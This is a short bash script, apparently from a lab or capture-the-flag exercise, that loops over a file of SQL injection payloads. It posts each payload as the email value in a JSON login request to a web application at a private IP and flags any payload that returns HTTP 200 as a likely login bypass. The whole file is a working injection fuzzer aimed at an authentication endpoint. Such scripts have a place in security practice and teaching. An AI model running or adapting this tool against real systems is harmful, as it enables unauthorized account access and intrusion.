#!/bin/bash

# Read SQLi queries from file
fuzz="/root/Documents/burp_SQLi_small.fuzz"	

# Loop through SQLi file line-by-line
while read line
do
	# Use 'curl' to send POST requests
	result=$(curl -s -o /dev/null -H 'Content-Type: application/json' --data '{"email":"'"$line"'","password":"asdf"}' -w "%{http_code}" http://10.10.10.19:3000/rest/user/login)

	# Output of 'curl' was too much to deal with. Needed a filter
	# Decided to silence curl's output (-s -o /dev/null)
	# and filter by HTTP status codes (-w "%{http_code}")

	# If server returns a '200' code, then SQL injection worked
	if [[ "$result" == "200" ]]
	then
		echo "Possible Match! $line" # Print matches
		continue
	fi
# Mechanism for feeding file contents to loop line-by-line
done < $fuzz
